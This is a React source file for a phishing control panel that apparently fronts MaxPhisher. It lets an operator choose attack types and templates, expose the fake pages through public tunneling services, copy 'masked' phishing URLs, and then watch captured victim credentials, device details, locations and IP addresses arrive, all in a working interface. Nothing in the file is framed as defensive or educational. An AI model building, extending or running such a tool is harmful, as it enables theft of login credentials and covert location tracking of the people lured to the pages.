import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';

// Capture Display Component - Reusable component for displaying different capture types
const CaptureDisplay = ({ title, data, format }) => {
    if (!data || (Array.isArray(data) && data.length === 0)) return null;
    
    return (
        <div className="mb-4">
            <h4 className="font-medium text-sm mb-1">{title} ({Array.isArray(data) ? data.length : 1})</h4>
            {format === 'json' ? (
                <div className="max-h-40 overflow-auto">
                    <pre className="text-xs bg-gray-50 dark:bg-gray-800 p-2 rounded">
                        {JSON.stringify(data, null, 2)}
                    </pre>
                </div>
            ) : (
                <ul className="list-disc list-inside pl-2 text-sm">
                    {Array.isArray(data) ? data.map((item, i) => (
                        <li key={i} className="truncate">{item}</li>
                    )) : <li>{data}</li>}
                </ul>
            )}
        </div>
    );
};

const PhishingTool = () => {
    // Base state 
    const [options, setOptions] = useState({
        attackType: 'login',
        template: '1',
        port: 8080,
        tunneler: 'cloudflared'
    });
    
    // Templates state
    const [templates, setTemplates] = useState({});
    const [templatesLoading, setTemplatesLoading] = useState(true);
    const [templatesError, setTemplatesError] = useState(null);
    const [availableTemplates, setAvailableTemplates] = useState([]);
    
    // Attack state
    const [isActive, setIsActive] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [statusMessage, setStatusMessage] = useState('');
    const [uiError, setUiError] = useState('');
    const [backendError, setBackendError] = useState('');
    const [backendLogs, setBackendLogs] = useState('');
    
    // Results state
    const [urls, setUrls] = useState([]);
    const [captures, setCaptures] = useState({
        credentials: [],
        deviceInfo: [],
        locations: [],
        ips: []
    });
    
    // Polling timer for fetching status/captures when attack is active
    const [pollingTimer, setPollingTimer] = useState(null);
    
    // Fetch templates on component mount
    useEffect(() => {
        fetchTemplates();
        // Cleanup on unmount
        return () => {
            if (pollingTimer) clearInterval(pollingTimer);
        };
    }, []);
    
    // Update available templates when attack type changes
    useEffect(() => {
        if (options.attackType && templates[options.attackType?.toUpperCase()]) {
            setAvailableTemplates(templates[options.attackType?.toUpperCase()] || []);
            // Reset template selection if current selection is invalid
            if (options.template > templates[options.attackType?.toUpperCase()]?.length) {
                setOptions(prev => ({...prev, template: '1'}));
            }
        } else {
            setAvailableTemplates([]);
        }
    }, [options.attackType, templates]);
    
    // Set up polling when attack becomes active
    useEffect(() => {
        if (isActive) {
            // Initial check right away
            checkStatusAndCaptures();
            
            // Set up polling every 5 seconds
            const timer = setInterval(() => {
                checkStatusAndCaptures();
            }, 5000);
            
            setPollingTimer(timer);
            
            // Cleanup
            return () => clearInterval(timer);
        } else {
            // Clear polling when attack is stopped
            if (pollingTimer) {
                clearInterval(pollingTimer);
                setPollingTimer(null);
            }
        }
    }, [isActive]);
    
    // Fetch templates from backend
    const fetchTemplates = async () => {
        setTemplatesLoading(true);
        setTemplatesError(null);
        
        try {
            const response = await fetch('/api/phishing', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ action: 'get_templates' }),
            });
            
            const data = await response.json();
            
            if (data.success && data.templates) {
                setTemplates(data.templates);
                // Set available templates for current attack type
                if (options.attackType && data.templates[options.attackType.toUpperCase()]) {
                    setAvailableTemplates(data.templates[options.attackType.toUpperCase()]);
                }
            } else {
                setTemplatesError(data.error || 'Failed to load templates');
            }
        } catch (error) {
            console.error('Error fetching templates:', error);
            setTemplatesError(error.message || 'Network error while loading templates');
        } finally {
            setTemplatesLoading(false);
        }
    };
    
    // Start the phishing attack
    const handleStartAttack = async () => {
        setIsLoading(true);
        setUiError('');
        setBackendError('');
        setBackendLogs('');
        setStatusMessage('Initiating attack...');
        
        try {
            const response = await fetch('/api/phishing', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    action: 'start',
                    options: options
                }),
            });
            
            const data = await response.json();
            
            if (data.success) {
                setStatusMessage('Attack initiated. Setting up tunnels...');
                setIsActive(true);
                // URLs will be fetched by polling
            } else {
                setBackendError(data.error || 'Unknown error starting attack');
                if (data.logs) setBackendLogs(data.logs);
                setStatusMessage('Failed to start attack');
            }
        } catch (error) {
            console.error('Error starting attack:', error);
            setUiError(error.message || 'Network error while starting attack');
            setStatusMessage('Failed to start attack');
        } finally {
            setIsLoading(false);
        }
    };
    
    // Stop the phishing attack
    const handleStopAttack = async () => {
        setIsLoading(true);
        setUiError('');
        setBackendError('');
        setStatusMessage('Stopping attack...');
        
        try {
            const response = await fetch('/api/phishing', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ action: 'stop' }),
            });
            
            const data = await response.json();
            
            if (data.success) {
                setStatusMessage('Attack stopped successfully');
                setIsActive(false);
                // Don't clear results to allow viewing after stopping
            } else {
                setBackendError(data.error || 'Unknown error stopping attack');
                setStatusMessage('Error stopping attack');
            }
        } catch (error) {
            console.error('Error stopping attack:', error);
            setUiError(error.message || 'Network error while stopping attack');
            setStatusMessage('Error stopping attack');
        } finally {
            setIsLoading(false);
        }
    };
    
    // Check attack status and fetch captures
    const checkStatusAndCaptures = async () => {
        try {
            const response = await fetch('/api/phishing', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ action: 'captures' }), // This also includes status check
            });
            
            const data = await response.json();
            
            // Handle URLs if present and status is ready
            if (data.success && data.status === 'ready' && data.isRunning) {
                // Process URLs from the data
                if (data.urls) {
                    const urlList = [];
                    // Convert the URLs object from API to an array format for the UI
                    Object.entries(data.urls).forEach(([tunneler, url]) => {
                        // Some URLs might have both regular and masked versions
                        if (typeof url === 'object') {
                            if (url.URL) urlList.push({ tunneler, url: url.URL });
                            if (url.MaskedURL) urlList.push({ tunneler: `${tunneler} (Masked)`, url: url.MaskedURL });
                        } else {
                            urlList.push({ tunneler, url });
                        }
                    });
                    setUrls(urlList);
                }
                
                if (statusMessage === 'Attack initiated. Setting up tunnels...') {
                    setStatusMessage('Attack active. Phishing URLs generated.');
                }
            }
            
            // Update status and captures data
            if (data.captures) {
                setCaptures(data.captures);
            }
            
            // Handle errors or status changes
            if (!data.success || !data.isRunning) {
                // Attack has failed or stopped externally
                if (data.error) {
                    setBackendError(data.error);
                    if (data.logs) setBackendLogs(data.logs);
                }
                
                if (!data.isRunning && isActive) {
                    setStatusMessage('Attack stopped unexpectedly');
                    setIsActive(false);
                }
            }
        } catch (error) {
            console.error('Error checking status:', error);
            setUiError(`Failed to check status: ${error.message}`);
        }
    };
    
    // Handle form field changes
    const handleAttackTypeChange = (e) => {
        const newType = e.target.value;
        setOptions(prev => ({
            ...prev,
            attackType: newType,
            template: '1' // Reset to first template when type changes
        }));
    };
    
    const handleTemplateChange = (e) => {
        setOptions(prev => ({
            ...prev,
            template: e.target.value
        }));
    };
    
    return (
        <div className="max-w-4xl mx-auto p-4 space-y-6 bg-white dark:bg-gray-900 text-gray-900 dark:text-gray-100 rounded-lg shadow-lg">
            <h2 className="text-2xl font-bold text-center mb-6">Phishing Attack Configuration</h2>

            {/* Templates Loading/Error State */}
            {templatesLoading && <p className="text-center text-blue-500">Loading templates...</p>}
            {templatesError && <p className="text-center text-red-500">Error loading templates: {templatesError}</p>}


            {/* Attack Configuration */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Left Column */}
                <div className="space-y-4">
                    <div className="form-group">
                        <label htmlFor="attackType" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Attack Type</label>
                        <select
                            id="attackType"
                            // Use lowercase value for consistency
                            value={options.attackType?.toLowerCase() || 'login'}
                            onChange={handleAttackTypeChange}
                            className="dark-input w-full" // Use w-full for consistency
                            disabled={isLoading || isActive || templatesLoading || !!templatesError}
                        >
                            {/* Map through template keys (which are capitalized) */}
                            {Object.keys(templates).map(typeName => (
                                // Use lowercase typeName as value for internal state consistency
                                <option key={typeName} value={typeName.toLowerCase()}>
                                    {typeName} {/* Display capitalized name */}
                                </option>
                            ))}
                            {/* Fallback if templates are empty/failed */}
                            {!templatesLoading && Object.keys(templates).length === 0 && (
                                <option value="">No templates loaded</option>
                            )}
                        </select>
                    </div>

                    <div className="form-group">
                        <label htmlFor="template" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Template</label>
                        <select
                            id="template"
                            value={options.template || '1'} // Default to '1' if undefined
                            onChange={handleTemplateChange}
                            className="dark-input w-full"
                            disabled={isLoading || isActive || templatesLoading || !!templatesError || availableTemplates.length === 0}
                        >
                            {availableTemplates.map((template, index) => (
                                // Use 1-based index as value for MaxPhisher -o flag
                                <option key={template.folder || index} value={String(index + 1)}>
                                    {template.name} ({index + 1})
                                </option>
                            ))}
                            {availableTemplates.length === 0 && <option value="">Select Attack Type First</option>}
                        </select>
                    </div>

                    {/* --- Conditional Inputs - CHECK TYPE AND TEMPLATE INDEX --- */}
                    {/* Festival Name: Only for Image type, Template 1 */}
                    {options.attackType === 'image' && options.template === '1' && (
                        <div className="form-group">
                            <label htmlFor="festival" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Festival Name</label>
                            <input id="festival" type="text" value={options.festival || ''}
                                onChange={e => setOptions(o => ({ ...o, festival: e.target.value }))}
                                className="dark-input w-full" placeholder="e.g., Birthday"
                                disabled={isLoading || isActive}
                            />
                        </div>
                    )}
                    {/* YouTube ID: Only for Image type, Template 2 OR Video type (any template) */}
                    {( (options.attackType === 'image' && options.template === '2') || options.attackType === 'video' ) && (
                        <div className="form-group">
                            <label htmlFor="ytId" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">YouTube Video ID</label>
                            <input id="ytId" type="text" value={options.ytId || ''}
                                onChange={e => setOptions(o => ({ ...o, ytId: e.target.value }))}
                                className="dark-input w-full" placeholder="e.g., dQw4w9WgXcQ"
                                disabled={isLoading || isActive}
                            />
                        </div>
                    )}
                    {/* Media Duration: Only for Video or Audio types */}
                    {(options.attackType === 'video' || options.attackType === 'audio') && (
                        <div className="form-group">
                            <label htmlFor="duration" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Media Duration (ms)</label>
                            <input id="duration" type="number" value={options.duration || 5000}
                                onChange={e => setOptions(o => ({ ...o, duration: parseInt(e.target.value) || 5000 }))}
                                className="dark-input w-full" min="1000" step="1000"
                                disabled={isLoading || isActive}
                            />
                        </div>
                    )}
                </div>

                {/* Right Column */}
                <div className="space-y-4">
                    <div className="form-group">
                        <label htmlFor="tunneler" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Tunneling Service</label>
                        <select id="tunneler" value={options.tunneler || 'cloudflared'}
                            onChange={e => setOptions(o => ({ ...o, tunneler: e.target.value }))}
                            className="dark-input w-full"
                            disabled={isLoading || isActive}
                        >
                            <option value="cloudflared">☁️ Cloudflare</option>
                            <option value="loclx">🔒 LocalXpose</option>
                            <option value="localhostrun">🏃♂️ LocalHostRun</option>
                            <option value="serveo">🌐 Serveo</option>
                        </select>
                    </div>

                    {options.tunneler === 'loclx' && (
                        <>
                            <div className="form-group">
                                <label htmlFor="region" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Region (LocalXpose)</label>
                                <input id="region" type="text" value={options.region || ''} // Default to empty, let script handle default if needed
                                    onChange={e => setOptions(o => ({ ...o, region: e.target.value }))}
                                    className="dark-input w-full" placeholder="e.g., eu, us, ap (optional)"
                                    disabled={isLoading || isActive}
                                />
                            </div>
                            <div className="form-group">
                                <label htmlFor="subdomain" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Subdomain (LocalXpose Pro)</label>
                                <input id="subdomain" type="text" value={options.subdomain || ''}
                                    onChange={e => setOptions(o => ({ ...o, subdomain: e.target.value }))}
                                    className="dark-input w-full" placeholder="Requires PRO account (optional)"
                                    disabled={isLoading || isActive}
                                />
                            </div>
                        </>
                    )}

                    {/* Shared Options */}
                    <div className="form-group">
                        <label htmlFor="redirectUrl" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Redirect URL (Optional)</label>
                        <input id="redirectUrl" type="url" value={options.redirectUrl || ''}
                            onChange={e => setOptions(o => ({ ...o, redirectUrl: e.target.value }))}
                            className="dark-input w-full" placeholder="https://example.com (after capture)"
                            disabled={isLoading || isActive}
                        />
                    </div>
                    <div className="form-group">
                        <label htmlFor="port" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Internal Port</label>
                        <input id="port" type="number" value={options.port || 8080}
                            onChange={e => setOptions(o => ({ ...o, port: parseInt(e.target.value) || 8080 }))}
                            className="dark-input w-full" min="1024" max="65535" // Avoid privileged ports
                            disabled={isLoading || isActive}
                        />
                    </div>
                </div>
            </div>

            {/* Control Button */}
            <button
                onClick={isActive ? handleStopAttack : handleStartAttack}
                className={`w-full py-3 rounded-lg font-bold transition-all text-white ${
                    isActive
                        ? 'bg-red-600 hover:bg-red-700 dark:bg-red-700 dark:hover:bg-red-800'
                        : 'bg-green-600 hover:bg-green-700 dark:bg-green-700 dark:hover:bg-green-800'
                } ${isLoading ? 'opacity-50 cursor-not-allowed' : ''} ${ (templatesLoading || !!templatesError) ? 'opacity-50 cursor-not-allowed' : '' }`}
                disabled={isLoading || templatesLoading || !!templatesError || (!isActive && !options.template)} // Disable start if no template selected
            >
                {isLoading ? (isActive ? 'Stopping...' : 'Starting...') : (isActive ? '🛑 Stop Attack' : '🚀 Start Phishing Attack')}
            </button>

            {/* Status & Error Messages */}
            <div className="text-center text-sm mt-3 space-y-1">
                {statusMessage && (
                    <p className="text-gray-600 dark:text-gray-400">{statusMessage}</p>
                )}
                {uiError && ( // Network/UI specific errors
                    <p className="text-orange-600 dark:text-orange-400">Network/UI Error: {uiError}</p>
                )}
                {backendError && ( // Errors from the backend API/script
                    <p className="text-red-600 dark:text-red-400">Backend Error: {backendError}</p>
                )}
                {backendLogs && ( // Logs from backend on error
                    <details className="text-left mt-2">
                        <summary className="cursor-pointer text-xs text-gray-500 dark:text-gray-400">Show Logs</summary>
                        <pre className="mt-1 text-xs bg-gray-100 dark:bg-gray-800 p-2 rounded border border-gray-300 dark:border-gray-700 whitespace-pre-wrap break-all">
                            {backendLogs}
                        </pre>
                    </details>
                )}
            </div>


            {/* Results Section */}
            <div className="space-y-6 mt-8">
                {/* URLs */}
                {urls.length > 0 && (
                    <motion.div
                        initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }}
                        className="dark-card p-4 border border-gray-200 dark:border-gray-700 rounded-md"
                    >
                        <h3 className="section-title text-lg font-semibold mb-3">Generated URLs</h3>
                        <div className="space-y-2">
                            {urls.map(({ tunneler, url }, i) => (
                                <div key={tunneler || i} className="url-item flex flex-col sm:flex-row justify-between items-start sm:items-center bg-gray-50 dark:bg-gray-800 p-2 rounded">
                                    <span className="url-tunneler font-semibold mr-2 capitalize mb-1 sm:mb-0">{tunneler || 'Unknown'}:</span>
                                    <span className="url-value text-sm flex-grow break-all mr-2 text-blue-600 dark:text-blue-400">{url}</span>
                                    <button onClick={() => navigator.clipboard.writeText(url)}
                                        className="copy-btn p-1 px-2 text-xs bg-blue-600 hover:bg-blue-700 text-white rounded mt-1 sm:mt-0 flex items-center"
                                    >
                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                                        Copy
                                    </button>
                                </div>
                            ))}
                        </div>
                    </motion.div>
                )}

                {/* Captures */}
                {(captures.credentials?.length > 0 || captures.ips?.length > 0 || captures.deviceInfo?.length > 0 || captures.locations?.length > 0) && (
                    <motion.div
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2, duration: 0.3 }}
                        className="dark-card p-4 border border-gray-200 dark:border-gray-700 rounded-md"
                    >
                        <h3 className="section-title text-lg font-semibold mb-3">Captured Data</h3>
                        <div className="space-y-4">
                            {/* Use CaptureDisplay component */}
                            <CaptureDisplay title="Credentials" data={captures.credentials} format="json" />
                            <CaptureDisplay title="Device Info" data={captures.deviceInfo} format="json" />
                            <CaptureDisplay title="Locations" data={captures.locations} format="json" />
                            <CaptureDisplay title="IP Addresses" data={captures.ips} format="text" />
                            {/* TODO: Add display for media files if implemented */}
                        </div>
                    </motion.div>
                )}
                {/* Show message if attack is active but no captures yet */}
                {isActive && urls.length > 0 && !(captures.credentials?.length > 0 || captures.ips?.length > 0 || captures.deviceInfo?.length > 0 || captures.locations?.length > 0) && (
                    <p className="text-center text-gray-500 dark:text-gray-400 text-sm">Attack active, waiting for victim interaction...</p>
                )}
            </div>

            {/* Global Styles (Keep as is) */}
            <style jsx global>{`
              .dark-input { background-color: #1f2937; color: #f3f4f6; border: 1px solid #4b5563; border-radius: 0.375rem; padding: 0.5rem 0.75rem; transition: border-color 0.2s; }
              .dark-input:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5); }
              .dark-input:disabled { background-color: #374151; opacity: 0.6; cursor: not-allowed; }
              select.dark-input { appearance: none; background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%239ca3af' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e"); background-position: right 0.5rem center; background-repeat: no-repeat; background-size: 1.5em 1.5em; padding-right: 2.5rem; }
            `}</style>
        </div>
    );
};

export default PhishingTool;